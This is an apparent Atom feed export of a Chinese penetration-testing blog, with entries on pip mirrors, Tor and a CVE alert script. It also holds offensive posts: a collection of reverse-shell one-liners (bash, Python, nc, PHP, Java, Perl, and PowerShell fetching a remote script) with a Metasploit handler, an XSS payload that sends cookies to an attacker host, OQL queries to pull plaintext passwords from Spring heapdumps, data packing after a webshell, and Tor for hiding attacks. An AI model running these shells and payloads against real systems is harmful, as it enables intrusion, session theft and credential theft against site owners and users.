class="line">%APPDATA%\pip\pip.ini</span><br></pre></td></tr></table></figure><p>修改内容如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line">index-url &#x3D; https:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;pypi&#x2F;simple&#x2F;</span><br></pre></td></tr></table></figure><p><font color=green><u>若使用非HTTPS源需在文件中加入</u></font></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[install]</span><br><span class="line">trusted-host&#x3D;mirrors.aliyun.com</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;pip国内的一些镜像&quot;&gt;&lt;a href=&quot;#pip国内的一些镜像&quot; class=&quot;headerlink&quot; title=&quot;pip国内的一些镜像&quot;&gt;&lt;/a&gt;pip国内的一些镜像&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;阿里云 &lt;a href=&quot;http://mirrors.aliyun.com/pypi/simple/?spm=a2c6h.12873639.0.0.22b62cdbVtYOZm&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://mirrors.aliyun.com/pypi/simple/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;中国科技大学 &lt;a href=&quot;https://pypi.mirrors.ustc.edu.cn/simple/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://pypi.mirrors.ustc.edu.cn/simple/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;豆瓣(douban) &lt;a href=&quot;http://pypi.douban.com/simple/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://pypi.douban.com/simple/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;清华大学 &lt;a href=&quot;https://pypi.tuna.tsinghua.edu.cn/simple/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://pypi.tuna.tsinghua.edu.cn/simple/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;中国科学技术大学 &lt;a href=&quot;http://pypi.mirrors.ustc.edu.cn/simple/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://pypi.mirrors.ustc.edu.cn/simple/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;u&gt;提示：若担心安全问题可使用HTTPS加密源&lt;/u&gt;&lt;/p&gt;
&lt;h3 id=&quot;修改源的方法&quot;&gt;&lt;a href=&quot;#修改源的方法&quot; class=&quot;headerlink&quot; title=&quot;修改源的方法&quot;&gt;&lt;/a&gt;修改源的方法&lt;/h3&gt;&lt;h4 id=&quot;临时使用：&quot;&gt;&lt;a href=&quot;#临时使用：&quot; class=&quot;headerlink&quot; title=&quot;临时使用：&quot;&gt;&lt;/a&gt;临时使用：&lt;/h4&gt;&lt;p&gt;Linux Mac Windows通用命令
    
    </summary>
    
    
      <category term="Programming" scheme="http://yoursite.com/categories/Programming/"/>
    
    
  </entry>
  
  <entry>
    <title>MAT 查找 spring heapdump中的密码明文</title>
    <link href="http://yoursite.com/2020/spring.html"/>
    <id>http://yoursite.com/2020/spring.html</id>
    <published>2020-11-05T07:46:45.000Z</published>
    <updated>2021-04-14T06:13:20.537Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一、简介："><a href="#一、简介：" class="headerlink" title="一、简介："></a>一、简介：</h3><p>访问 /env 接口时，spring actuator 会将一些带有敏感关键词 (如 password、secret) 的属性名对应的属性值用 号替换，以达到脱敏的效果。在目标既不出网，/jolokia 接口又没有合适的 MBean 或者不支持 POST 请求的情况下，很多获取被星号脱敏的密码的明文的方法就失效了。这时候就可以利用 Eclipse Memory Analyzer 工具来分析 /heapdump 或 /actuator/heapdump 接口下载的 jvm heap 信息，查找密码明文。</p><h3 id="二、查找方法："><a href="#二、查找方法：" class="headerlink" title="二、查找方法："></a>二、查找方法：</h3><p>使用 Eclipse Memory Analyzer 直接打开下载的 heapdump 文件，点击 OQL 标签，在查询框中输入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> org.springframework.web.context.support.StandardServletEnvironment</span><br></pre></td></tr></table></figure><p>然后点击红色感叹号执行查询。如下图， spring boot 1.x 版本 heapdump 查询结果，最终结果存储在 java.util.Hashtable$Entry 实例的键值对中：</p><img src="../images/upload/2020110501.png" style="zoom: 33%;" /><a id="more"></a>所以也可以用<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> java.util.Hashtable$Entry x <span class="keyword">WHERE</span> (toString(x.key).contains(<span class="string">"password"</span>))</span><br></pre></td></tr></table></figure><p>来查询。下图为 spring boot 2.x 版本 heapdump 查询结果，最终结果存储在 java.util.LinkedHashMap$Entry 实例的键值对中：</p><img src="../images/upload/2020110502.png" style="zoom: 33%;" /><p>所以也可以用</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> java.util.LinkedHashMap$Entry x <span class="keyword">WHERE</span> (toString(x.key).contains(<span class="string">"password"</span>))</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;一、简介：&quot;&gt;&lt;a href=&quot;#一、简介：&quot; class=&quot;headerlink&quot; title=&quot;一、简介：&quot;&gt;&lt;/a&gt;一、简介：&lt;/h3&gt;&lt;p&gt;访问 /env 接口时，spring actuator 会将一些带有敏感关键词 (如 password、secret) 的属性名对应的属性值用 号替换，以达到脱敏的效果。在目标既不出网，/jolokia 接口又没有合适的 MBean 或者不支持 POST 请求的情况下，很多获取被星号脱敏的密码的明文的方法就失效了。这时候就可以利用 Eclipse Memory Analyzer 工具来分析 /heapdump 或 /actuator/heapdump 接口下载的 jvm heap 信息，查找密码明文。&lt;/p&gt;
&lt;h3 id=&quot;二、查找方法：&quot;&gt;&lt;a href=&quot;#二、查找方法：&quot; class=&quot;headerlink&quot; title=&quot;二、查找方法：&quot;&gt;&lt;/a&gt;二、查找方法：&lt;/h3&gt;&lt;p&gt;使用 Eclipse Memory Analyzer 直接打开下载的 heapdump 文件，点击 OQL 标签，在查询框中输入&lt;/p&gt;
&lt;figure class=&quot;highlight sql&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;select&lt;/span&gt; * &lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; org.springframework.web.context.support.StandardServletEnvironment&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;然后点击红色感叹号执行查询。如下图， spring boot 1.x 版本 heapdump 查询结果，最终结果存储在 java.util.Hashtable$Entry 实例的键值对中：&lt;/p&gt;
&lt;img src=&quot;../images/upload/2020110501.png&quot; style=&quot;zoom: 33%;&quot; /&gt;
    
    </summary>
    
    
      <category term="Penetration" scheme="http://yoursite.com/categories/Penetration/"/>
    
    
  </entry>
  
  <entry>
    <title>源码或文件打包</title>
    <link href="http://yoursite.com/2020/%E6%BA%90%E7%A0%81%E6%88%96%E6%96%87%E4%BB%B6%E6%89%93%E5%8C%85.html"/>
    <id>http://yoursite.com/2020/%E6%BA%90%E7%A0%81%E6%88%96%E6%96%87%E4%BB%B6%E6%89%93%E5%8C%85.html</id>
    <published>2020-10-13T08:54:00.000Z</published>
    <updated>2021-04-14T06:13:20.540Z</updated>
    
    <content type="html"><![CDATA[<p>​        在我们拿下webshell的时候，想要获取数据或者源码往往会用菜刀或者蚁剑去打包，但是这个时候往往就会出现很多问题，列如打包失败，或者是打包得不完整等等。</p><p>这个时候如果对方是windows服务器的话，我们可以将winrar安装包中的winrar.exe或者本地装的<code>winrar.exe</code>上传过去</p><img src="../images/upload/winrar.jpg" style="zoom:50%;" /><a id="more"></a><p>压缩盘下的data文件夹，并且命名为bak.rar  <code>winrar.exe a -ag -k -r -s -ibck c:/bak.rar c:/data/</code></p><p>压缩多个文件 <code>winrar a -ag -ibck bak.rar filename1 filename2 filename....</code></p><p>参数说明： <code>a</code> :备份所有文件； <code>-ag</code> :当创建压缩文件时，以格式“YYYYMMDDHHMMSS”附加当前日期字符串,文件名bakYYYYMMDDHHMMSS.rar； <code>-k</code> :锁定压缩文件； <code>-r</code>:备份目录和子目录； <code>-s</code> :创建固实压缩文件； <code>-ibck</code>:后台运行；</p><p><code>filename1</code>：要压缩的文件名，可以多个，也可用通配符`file*</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;​        在我们拿下webshell的时候，想要获取数据或者源码往往会用菜刀或者蚁剑去打包，但是这个时候往往就会出现很多问题，列如打包失败，或者是打包得不完整等等。&lt;/p&gt;
&lt;p&gt;这个时候如果对方是windows服务器的话，我们可以将winrar安装包中的winrar.exe或者本地装的&lt;code&gt;winrar.exe&lt;/code&gt;上传过去&lt;/p&gt;
&lt;img src=&quot;../images/upload/winrar.jpg&quot; style=&quot;zoom:50%;&quot; /&gt;
    
    </summary>
    
    
      <category term="Penetration" scheme="http://yoursite.com/categories/Penetration/"/>
    
    
  </entry>
  
  <entry>
    <title>Tor的使用与Penetration</title>
    <link href="http://yoursite.com/2020/tor%E4%BD%BF%E7%94%A8.html"/>
    <id>http://yoursite.com/2020/tor%E4%BD%BF%E7%94%A8.html</id>
    <published>2020-08-09T04:36:53.000Z</published>
    <updated>2021-04-14T06:13:20.538Z</updated>
    
    <content type="html"><![CDATA[<p>Tor主要用来访问匿名网络也就是已<code>.onion</code>结尾的域名，当然也可访问某些正常的网站如google、twitter等，但并不推荐如此做；今天要说的是在Penetration中如何利用Tor网络对目标进行渗透，防止被溯源和审查等，隐藏攻击者身份和IP地址</p><p>官方解释：<font color=green>Tor是一个您能运行在您的电脑上，保护您在互联网上安全的程序。 它会将您的通信在一个由多个中继站组成的分散网络内不断传递，这些中继站被来自世界各地的志愿者们运营，并以此来保护您：这阻止了某些人通过您访问了哪些网址来得知您的网络链接，也防止了您访问的网站获取您的地理位置。 这些由志愿者搭建的中继被成为 Tor 网络。</font><a id="more"></a></p><h3 id="0x01-访问Tor的方式"><a href="#0x01-访问Tor的方式" class="headerlink" title="0x01 访问Tor的方式"></a>0x01 访问Tor的方式</h3><hr><p>1、直接使用Tor Browser浏览器，内置Tor Project加上Firefox浏览器–<code>推荐</code></p><p>2、源码安装Tor Project，然后配合其它浏览器使用–<code>Geek</code></p><h3 id="0x02-安装Tor-Browser浏览器"><a href="#0x02-安装Tor-Browser浏览器" class="headerlink" title="0x02 安装Tor Browser浏览器"></a>0x02 安装Tor Browser浏览器</h3><hr><p>下载地址：<br>Windows：<code>https://www.torproject.org/dist/torbrowser/9.5.3/torbrowser-install-win64-9.5.3_zh-CN.exe</code></p><p>Mac  os：<code>https://www.torproject.org/dist/torbrowser/9.5.3/TorBrowser-9.5.3-osx64_zh-CN.dmg</code></p><p>之后的安装过程就和其它程序一样了，这里不在赘述</p><h3 id="0x03-安装Tor-Project"><a href="#0x03-安装Tor-Project" class="headerlink" title="0x03 安装Tor Project"></a>0x03 安装Tor Project</h3><hr><p>Mac OS：<code>brew install tor</code></p><p>Windows：<code>https://www.torproject.org/dist/torbrowser/9.5.3/tor-win32-0.4.3.6.zip</code></p><h3 id="0x04-Tor-配置文件"><a href="#0x04-Tor-配置文件" class="headerlink" title="0x04 Tor 配置文件"></a>0x04 Tor 配置文件</h3><hr><p>Mac OS:<br><code>/usr/local/Cellar/tor/</code> :Tor的安装路径<br><code>/usr/local/etc/tor/torrc</code>  :Tor的配置文件</p><p>Windows:<br><code>解压后的存放路径</code>  : Tor的安装路径<br><code>同路径下tor/torrc</code>  :Tor的配置文件</p><p>Mac：在下面路径<code>/usr/local/etc/tor</code>找到文件<code>torrc.sample</code>，拷贝一份命名为<code>torrc</code><br>Windows：双击tor.exe后会生成torrc文件，然后再编辑</p><p>常用配置的参数：</p><table><thead><tr><th>参数</th><th>作用</th><th></th></tr></thead><tbody><tr><td>Socks5Proxy</td><td>前置 Socks 代理端口</td><td></td></tr><tr><td>HTTPProxy</td><td>前置 HTTP 代理端口</td><td></td></tr><tr><td>HTTPSProxy</td><td>前置 HTTPS 代理端口</td><td></td></tr><tr><td>SocksProt</td><td>外部程序访问 Tor 的端口</td><td></td></tr><tr><td>MaxCircuitDirtiness</td><td>自动切换 ip 的时间间隔</td><td></td></tr></tbody></table><p>我的配置：</p><img src="../images/upload/tor1.png" style="zoom: 67%;" /><h3 id="0x05-确认是否接入Tor网络"><a href="#0x05-确认是否接入Tor网络" class="headerlink" title="0x05 确认是否接入Tor网络"></a>0x05 确认是否接入Tor网络</h3><hr><p>启动Tor：</p><p>Mac：<code>tor</code> 命令<br>Windows：双击<code>tor.exe</code></p><p>配置Tor生成的本地代理</p><p><img src="../images/upload/tor2.png" alt=""></p><p>访问 <code>https://check.torproject.org/</code></p><img src="/Users/tbo/github/hexo/source/images/upload/tor4.png" style="zoom: 33%;" /><h3 id="0x06-配合Burp-Suite使用"><a href="#0x06-配合Burp-Suite使用" class="headerlink" title="0x06 配合Burp Suite使用"></a>0x06 配合Burp Suite使用</h3><hr><p>在Burp Suite中配置tor本地代理地址，浏览器中配置bp的代理</p><p>User options-&gt;Connetctions</p><img src="../images/upload/tor3.png" style="zoom:50%;" /><p>OK,可以开始使用了<br><img src="../images/upload/tor5.png" style="zoom:50%;" /></p><img src="../images/upload/tor6.png" style="zoom:50%;" /><h3 id="0x07-最后"><a href="#0x07-最后" class="headerlink" title="0x07 最后"></a>0x07 最后</h3><p>使用Tor的注意事项⚠️：</p><p>1、<strong>请勿将您的手机在 Tor 上用于两步验证</strong><br>2、<strong>不要在 TOR 之外操作用户帐户</strong><br>3、<strong>不要发布有关您的任何个人信息</strong><br>4、<strong>不要通过 TOR 发送未加密的数据</strong><br>5、<strong>不要忘记删除 cookies 和本地网站数据</strong><br>6、<strong>请勿将 TOR 用于 Google 搜索</strong><br>7、<strong>不要在 TOR 上打开 HTTP 网站</strong><br>8、<strong>不要同时使用 Tor 和不使用 Tor 访问同一台服务器</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Tor主要用来访问匿名网络也就是已&lt;code&gt;.onion&lt;/code&gt;结尾的域名，当然也可访问某些正常的网站如google、twitter等，但并不推荐如此做；今天要说的是在Penetration中如何利用Tor网络对目标进行渗透，防止被溯源和审查等，隐藏攻击者身份和IP地址&lt;/p&gt;
&lt;p&gt;官方解释：&lt;font color=green&gt;Tor是一个您能运行在您的电脑上，保护您在互联网上安全的程序。 它会将您的通信在一个由多个中继站组成的分散网络内不断传递，这些中继站被来自世界各地的志愿者们运营，并以此来保护您：这阻止了某些人通过您访问了哪些网址来得知您的网络链接，也防止了您访问的网站获取您的地理位置。 这些由志愿者搭建的中继被成为 Tor 网络。&lt;/font&gt;
    
    </summary>
    
    
      <category term="Penetration" scheme="http://yoursite.com/categories/Penetration/"/>
    
    
  </entry>
  
  <entry>
    <title>实现每日推送CVE漏洞</title>
    <link href="http://yoursite.com/2020/CVE%E4%BF%A1%E6%81%AF.html"/>
    <id>http://yoursite.com/2020/CVE%E4%BF%A1%E6%81%AF.html</id>
    <published>2020-07-13T09:02:07.000Z</published>
    <updated>2021-04-14T06:26:31.206Z</updated>
    
    <content type="html"><![CDATA[<p><font color=green>随着安全工作的开展，关注查看每天的CVE漏洞成了安全从业人员的日常事项，你可能从公众号、朋友圈或其它漏洞平台获取漏洞信息， 但这些都不可能完全满足你想要的信息，比如你只关心tomcat、zabbix、fastjson等组件的漏洞，所以我开始想如何自动化的推送漏洞信息</font><a id="more"></a></p><h2 id="实现方法："><a href="#实现方法：" class="headerlink" title="实现方法："></a>实现方法：</h2><h3 id="1、获取CVE数据："><a href="#1、获取CVE数据：" class="headerlink" title="1、获取CVE数据："></a>1、获取CVE数据：</h3><p>可以爬取CVE官方网站每日公布的漏洞信息，但是当日漏洞没有漏洞定级和CVSS评分；而CVSS的评分需要NVD(美国国家漏洞数据库)，所以我这里直接选择使用NVD提供的api获取漏洞信息</p><p><img src="../images/upload/cve_01.png" alt=""></p><h3 id="2、漏洞信息过滤："><a href="#2、漏洞信息过滤：" class="headerlink" title="2、漏洞信息过滤："></a>2、漏洞信息过滤：</h3><p>获取的漏洞信息可能多可能少，而我们只需要获得想要的信息便可，比如只想获取2020-07-08号的高危漏洞情况</p><p><img src="../images/upload/cve_02.png" alt=""></p><h3 id="3、消息推送："><a href="#3、消息推送：" class="headerlink" title="3、消息推送："></a>3、消息推送：</h3><p>通过企业微信的api进行消息的推送<br><img src="../images/upload/cve_03.png" alt=""></p><h3 id="4、定时推送："><a href="#4、定时推送：" class="headerlink" title="4、定时推送："></a>4、定时推送：</h3><p>放在服务器上建立定时任务，比如每天上班前8:50推送消息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">50 08 * * * /usr/bin/python3 cve.py</span><br></pre></td></tr></table></figure><h3 id="5、效果展示："><a href="#5、效果展示：" class="headerlink" title="5、效果展示："></a>5、效果展示：</h3><p><img src="../images/upload/cve_04.jpg" alt=""></p><p><img src="../images/upload/cve_05.jpg" alt=""></p><h3 id="最后："><a href="#最后：" class="headerlink" title="最后："></a>最后：</h3><p>有些事情做起来没什么难度，但你的想法、思考很重要…获取源码方式，请公众号内回复’CVE’即可</p><hr><p>参考链接：</p><p><a href="https://nvd.nist.gov/General/News/New-NVD-CVE-CPE-API-and-SOAP-Retirement" target="_blank" rel="noopener">https://nvd.nist.gov/General/News/New-NVD-CVE-CPE-API-and-SOAP-Retirement</a><br><a href="https://work.weixin.qq.com/api/doc" target="_blank" rel="noopener">https://work.weixin.qq.com/api/doc</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;font color=green&gt;随着安全工作的开展，关注查看每天的CVE漏洞成了安全从业人员的日常事项，你可能从公众号、朋友圈或其它漏洞平台获取漏洞信息， 但这些都不可能完全满足你想要的信息，比如你只关心tomcat、zabbix、fastjson等组件的漏洞，所以我开始想如何自动化的推送漏洞信息&lt;/font&gt;
    
    </summary>
    
    
      <category term="Penetration" scheme="http://yoursite.com/categories/Penetration/"/>
    
    
  </entry>
  
  <entry>
    <title>常见反向shell方法</title>
    <link href="http://yoursite.com/2020/%E5%B8%B8%E7%94%A8%E5%8F%8D%E5%90%91shell.html"/>
    <id>http://yoursite.com/2020/%E5%B8%B8%E7%94%A8%E5%8F%8D%E5%90%91shell.html</id>
    <published>2020-07-09T07:55:34.000Z</published>
    <updated>2021-04-14T06:26:05.171Z</updated>
    
    <content type="html"><![CDATA[<h2 id="常见反向shell生成与使用方法："><a href="#常见反向shell生成与使用方法：" class="headerlink" title="常见反向shell生成与使用方法："></a>常见反向shell生成与使用方法：</h2><p>​    如果目标存在命令/代码执行漏洞，可用此些方法获取shell。</p><h3 id="Bash："><a href="#Bash：" class="headerlink" title="Bash："></a>Bash：</h3><p>​    Attacker：nc  -lvvp  4444</p><p>​    Victimer：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i  &gt;&amp; /dev/tcp/Attacker_IP/4444  0&gt;&amp;1</span><br></pre></td></tr></table></figure><a id="more"></a><h3 id="Python："><a href="#Python：" class="headerlink" title="Python："></a>Python：</h3><p>​    Attacker：nc  -lvvp  4444</p><p>​    Victimer：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.16.1.130",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'</span></span><br></pre></td></tr></table></figure><h3 id="Netcat-nc-："><a href="#Netcat-nc-：" class="headerlink" title="Netcat(nc)："></a>Netcat(nc)：</h3><p>​    如果目标机器存在nc且有-e参数，那么可以使用nc建立反向shell</p><p>​    Attacker：nc  -lvvp 4444</p><p>​    Victimer：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e  /bin/bash  Attacker_IP 4444</span><br></pre></td></tr></table></figure><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><p>​    Attacker：nc  -lvvp 4444</p><p>​    Victimer：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">'$sock=fsockopen("172.16.1.130",4444);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></span><br></pre></td></tr></table></figure><h3 id="Java："><a href="#Java：" class="headerlink" title="Java："></a>Java：</h3><p>​    Attacker：nc  -lvvp 4444</p><p>​    Victimer ：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"exec 5&lt;&gt;/dev/tcp/172.16.1.130/4444;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done"</span>] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure><h3 id="Perl："><a href="#Perl：" class="headerlink" title="Perl："></a>Perl：</h3><p>​    Attacker：nc  -lvvp 4444</p><p>​    Victimer：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">'use Socket;$i="172.16.1.130";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</span></span><br></pre></td></tr></table></figure><h3 id="Powershell："><a href="#Powershell：" class="headerlink" title="Powershell："></a>Powershell：</h3><p>​    Attacker：nc  -lvvp 4444</p><p>​    Victimer：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">'https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1'</span>);<span class="built_in">Invoke-PowerShellTcp</span> <span class="literal">-Reverse</span> <span class="literal">-IPAddress</span> <span class="number">172.16</span>.<span class="number">1.130</span> <span class="literal">-port</span> <span class="number">4444</span></span><br></pre></td></tr></table></figure><h3 id="Xterm："><a href="#Xterm：" class="headerlink" title="Xterm："></a>Xterm：</h3><p>​    Victimer:  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xterm -display Attacker_IP:1</span><br></pre></td></tr></table></figure><p>​    Attacker:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Xnest :1</span><br><span class="line">xhost +Victimer_IP</span><br></pre></td></tr></table></figure><h3 id="Msfvenom连接一句话："><a href="#Msfvenom连接一句话：" class="headerlink" title="Msfvenom连接一句话："></a>Msfvenom连接一句话：</h3><p>msf支持多种反弹方式，比如exe ps php asp aspx甚至是ruby等，我们可以用msfvenom来生成payload，然后在msf中监听，执行之后就会反弹回来session。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST 172.16.1.130</span><br><span class="line"><span class="built_in">set</span> LPORT 4444</span><br><span class="line"><span class="built_in">set</span> ExitOnSession <span class="literal">false</span></span><br><span class="line">exploit -j -z</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;常见反向shell生成与使用方法：&quot;&gt;&lt;a href=&quot;#常见反向shell生成与使用方法：&quot; class=&quot;headerlink&quot; title=&quot;常见反向shell生成与使用方法：&quot;&gt;&lt;/a&gt;常见反向shell生成与使用方法：&lt;/h2&gt;&lt;p&gt;​    如果目标存在命令/代码执行漏洞，可用此些方法获取shell。&lt;/p&gt;
&lt;h3 id=&quot;Bash：&quot;&gt;&lt;a href=&quot;#Bash：&quot; class=&quot;headerlink&quot; title=&quot;Bash：&quot;&gt;&lt;/a&gt;Bash：&lt;/h3&gt;&lt;p&gt;​    Attacker：nc  -lvvp  4444&lt;/p&gt;
&lt;p&gt;​    Victimer：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;bash -i  &amp;gt;&amp;amp; /dev/tcp/Attacker_IP/4444  0&amp;gt;&amp;amp;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="Penetration" scheme="http://yoursite.com/categories/Penetration/"/>
    
    
  </entry>
  
  <entry>
    <title>简易xss平台 获取Cookie</title>
    <link href="http://yoursite.com/2020/xss%E8%8E%B7%E5%8F%96.html"/>
    <id>http://yoursite.com/2020/xss%E8%8E%B7%E5%8F%96.html</id>
    <published>2020-06-30T07:38:52.000Z</published>
    <updated>2020-07-05T05:26:02.534Z</updated>
    
    <content type="html"><![CDATA[<p>1、启用python http服务器</p><img src="../images/upload/python3.png" style="zoom:67%;" /><p>2、在有xss的地方插入截获代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="built_in">document</span>.write(<span class="string">'&lt;img src="http://192.168.56.109/'</span>+<span class="built_in">document</span>.cookie+<span class="string">'" width=0 height=0 border=0 /&gt;'</span>);&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>3、等待管理员触发漏洞后，便会截获到cookie</p><img src="../images/upload/cookie.png" style="zoom: 67%;" />]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;1、启用python http服务器&lt;/p&gt;
&lt;img src=&quot;../images/upload/python3.png&quot; style=&quot;zoom:67%;&quot; /&gt;

&lt;p&gt;2、在有xss的地方插入截获代码&lt;/p&gt;
&lt;figure class=&quot;highlight jav
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Linux 查看硬件架构|系统版本|内核版本</title>
    <link href="http://yoursite.com/2020/linux%E7%89%88%E6%9C%AC.html"/>
    <id>http://yoursite.com/2020/linux%E7%89%88%E6%9C%AC.html</id>
    <published>2020-06-24T03:01:58.000Z</published>
    <updated>2021-04-14T06:04:32.872Z</updated>
    
    <content type="html"><![CDATA[<p><font color=green>有时候,我们可能需要获取Linux系统的一些关键信息,以下列举了部分常用的命令做为备忘📝</font></p><h3 id="一、查看系统架构"><a href="#一、查看系统架构" class="headerlink" title="一、查看系统架构"></a>一、查看系统架构</h3><ul><li><strong>hostnamectl</strong> 工具是用来管理给定主机中使用的三种类型的主机名，可以提供有关你的机器的最基本的信息。</li></ul><p><code>hostnamectl status</code></p><img src="../images/upload/hostnamectl.png" alt="hostnamectl" style="zoom:50%;" /><a id="more"></a><ul><li><p><strong>lscpu</strong>命令从sysfs和/proc/cpuinfo收集cpu体系结构信息，命令的输出比较易读，命令输出的信息包含cpu数量，线程，核数，套接字等。</p><img src="../images/upload/lscpu.png" style="zoom:50%;" /></li><li><p><strong>arch</strong>命令主要用于显示当前主机的硬件结构类型，arch命令输出的结果有：i386、i486、mips、alpha等。</p><img src="../images/upload/arch.png" style="zoom: 67%;" /></li><li><p><strong>uname</strong>命令的英文全称即“Unix name”，用于显示系统相关信息，比如主机名、内核版本号、硬件架构等。<br>-m 显示计算机硬件架构；-i  显示硬件平台</p><img src="../images/upload/uname1.png" style="zoom: 67%;" /></li></ul><h3 id="二、查看系统发行版本"><a href="#二、查看系统发行版本" class="headerlink" title="二、查看系统发行版本"></a>二、查看系统发行版本</h3><ul><li><p><strong>LSB</strong>是Linux Standard Base的缩写，lsb_release命令用来显示LSB和特定版本的相关信息。如果使用该命令时不带参数，则默认加上-v参数。</p><p>-d 显示系统全称和版本号；-a  显示LSB所有信息</p><img src="../images/upload/lsb_release.png" style="zoom:50%;" /></li><li><p><strong>/etc/*-release</strong>文件通常被视为操作系统的标识。在 <code>/etc</code> 